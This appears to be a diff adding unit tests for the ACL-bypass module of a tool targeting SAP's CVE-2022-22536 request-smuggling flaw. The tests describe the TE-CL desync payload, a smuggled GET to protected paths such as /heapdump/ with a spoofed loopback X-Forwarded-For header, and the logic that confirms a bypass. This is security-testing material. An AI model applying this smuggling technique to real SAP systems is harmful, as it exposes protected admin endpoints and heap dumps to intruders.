@@ -329,3 +329,156 @@ def test_fingerprint_web_dispatcher_connect_failure(monkeypatch):
                                                       timeout=2)
     assert out["is_wd"] is False
     assert out["evidence"] == ""
+
+
+# ---------------------------------------------------------------------------
+# D.2 — ACL bypass module
+# ---------------------------------------------------------------------------
+
+def test_acl_bypass_catalogue_shape():
+    """Lock the curated catalogue contents — 12 entries, each with
+    rationale + downstream + admin_grade."""
+    from sap_cve_2022_22536 import ACL_BYPASS_CATALOGUE
+    assert len(ACL_BYPASS_CATALOGUE) == 12
+    for path, why, downstream, grade in ACL_BYPASS_CATALOGUE:
+        assert path.startswith("/"), f"{path} must be absolute"
+        assert why and len(why) > 20, f"{path} needs a real rationale"
+        assert grade in ("critical", "high", "info"), (
+            f"{path} grade {grade!r} not in allowed set")
+
+
+def test_bypass_payload_uses_te_chunked():
+    """The bypass payload must use Transfer-Encoding: chunked with a
+    matching CL=4 (the SAPGateBreaker TE-CL desync shape)."""
+    from sap_cve_2022_22536 import _build_bypass_payload
+    payload = _build_bypass_payload("h", 1, outer_path="/nwa/",
+                                      target_path="/heapdump/")
+    assert b"Content-Length: 4\r\n" in payload
+    assert b"Transfer-Encoding: chunked\r\n" in payload
+    assert b"Connection: keep-alive\r\n" in payload
+    # Smuggled inner request
+    assert b"GET /heapdump/ HTTP/1.1" in payload
+    assert b"X-Forwarded-For: 127.0.0.1\r\n" in payload
+    # Zero-chunk terminator
+    assert b"0\r\n\r\n" in payload
+
+
+def test_bypass_payload_can_omit_loopback_spoof():
+    from sap_cve_2022_22536 import _build_bypass_payload
+    payload = _build_bypass_payload("h", 1, outer_path="/nwa/",
+                                      target_path="/sld/",
+                                      spoof_loopback=False)
+    assert b"X-Forwarded-For" not in payload
+    assert b"GET /sld/ HTTP/1.1" in payload
+
+
+def test_split_responses_two_responses():
+    from sap_cve_2022_22536 import _split_responses
+    buf = (b"HTTP/1.1 302 Found\r\nServer: backend\r\n\r\nbody1"
+           b"HTTP/1.0 503 Service Unavailable\r\nx-sap-icm-err-id: "
+           b"ICMENOSYSTEMFOUND\r\n\r\nbody2")
+    parts = _split_responses(buf)
+    assert len(parts) == 2
+    assert parts[0][0] == 302
+    assert parts[1][0] == 503
+    assert parts[0][2] == b"body1"
+    assert parts[1][2] == b"body2"
+
+
+def test_bypass_succeeded_status_promotion():
+    """Baseline 503, smuggled 200 → bypass confirmed."""
+    from sap_cve_2022_22536 import _bypass_succeeded
+    baseline = (503, b"x-sap-icm-err-id: ICMENOSYSTEMFOUND\r\n", b"")
+    smuggled = (200, b"Server: SAP NetWeaver AS Java\r\n", b"OK")
+    assert _bypass_succeeded(baseline, smuggled) is True
+
+
+def test_bypass_succeeded_backend_server_only_in_smuggled():
+    """Baseline 503 (WD page), smuggled 403 (backend page) — bypass too:
+    the smuggled request reached the backend instead of being blocked
+    at the WD.  Headers shape matches what _split_responses produces:
+    the status line + \\r\\n + header lines."""
+    from sap_cve_2022_22536 import _bypass_succeeded
+    baseline = (503,
+                b"HTTP/1.0 503 Service Unavailable\r\n"
+                b"x-sap-icm-err-id: ICMENOSYSTEMFOUND\r\n", b"")
+    smuggled = (403,
+                b"HTTP/1.1 403 Forbidden\r\n"
+                b"Server: SAP NetWeaver Application Server 7.54\r\n", b"")
+    assert _bypass_succeeded(baseline, smuggled) is True
+
+
+def test_bypass_blocked_identical_responses():
+    """Baseline 503 and smuggled 503 with same headers — not a bypass."""
+    from sap_cve_2022_22536 import _bypass_succeeded
+    same_hdrs = b"x-sap-icm-err-id: ICMENOSYSTEMFOUND\r\n"
+    assert _bypass_succeeded((503, same_hdrs, b""),
+                              (503, same_hdrs, b"")) is False
+
+
+def test_bypass_blocked_4xx_to_4xx():
+    """Status code stays in the 4xx/5xx range — not a bypass."""
+    from sap_cve_2022_22536 import _bypass_succeeded
+    assert _bypass_succeeded((403, b"", b""), (404, b"", b"")) is False
+
+
+def test_run_acl_bypass_paths_filter(monkeypatch):
+    """Operator-supplied paths list must filter the catalogue."""
+    import sap_cve_2022_22536 as mod
+    monkeypatch.setattr(mod, "_baseline_response",
+                         lambda *a, **k: (503, b"", b""))
+
+    fake_responses = b"HTTP/1.1 302 Found\r\n\r\nignored"
+    def fake_open_socket(*a, **k):
+        class S:
+            def settimeout(self, *a): pass
+            def sendall(self, *a): pass
+            def recv(self_, n):
+                if hasattr(self_, "_done"):
+                    return b""
+                self_._done = True
+                return fake_responses
+            def close(self): pass
+        return S()
+    monkeypatch.setattr(mod, "_open_socket", fake_open_socket)
+
+    out = mod.run_acl_bypass("h", 80, paths=["/heapdump/", "/sld/"],
+                              verbose=False)
+    assert set(out["results"].keys()) == {"/heapdump/", "/sld/"}
+    # With only one HTTP response (no second smuggled response), bypass
+    # must be False — bypass requires response[1] to be present.
+    for path, r in out["results"].items():
+        assert r["bypass_confirmed"] is False
+
+
+def test_run_acl_bypass_detects_bypass_when_smuggled_promotes(monkeypatch):
+    """End-to-end: 2 responses with status promotion → bypass_confirmed=True."""
+    import sap_cve_2022_22536 as mod
+    monkeypatch.setattr(mod, "_baseline_response",
+                         lambda *a, **k: (503, b"x-sap-icm-err-id: ICMENOSYSTEMFOUND\r\n",
+                                            b""))
+
+    # Construct a two-response buffer: WD 302 followed by backend 200
+    fake_buf = (b"HTTP/1.1 302 Found\r\nLocation: /\r\n\r\nbody"
+                b"HTTP/1.1 200 OK\r\nServer: SAP NetWeaver Application "
+                b"Server 7.50\r\nContent-Length: 4\r\n\r\nhprof")
+    def fake_open_socket(*a, **k):
+        class S:
+            sent = False
+            def settimeout(self, *a): pass
+            def sendall(self, *a): pass
+            def recv(self_, n):
+                if self_.sent: return b""
+                self_.sent = True
+                return fake_buf
+            def close(self): pass
+        return S()
+    monkeypatch.setattr(mod, "_open_socket", fake_open_socket)
+
+    out = mod.run_acl_bypass("h", 80, paths=["/heapdump/"], verbose=False)
+    r = out["results"]["/heapdump/"]
+    assert r["bypass_confirmed"] is True
+    assert r["smuggled_status"] == 200
+    assert r["baseline_status"] == 503
+    assert "hprof" in r["smuggled_snippet"]
+    assert r["admin_grade"] == "critical"
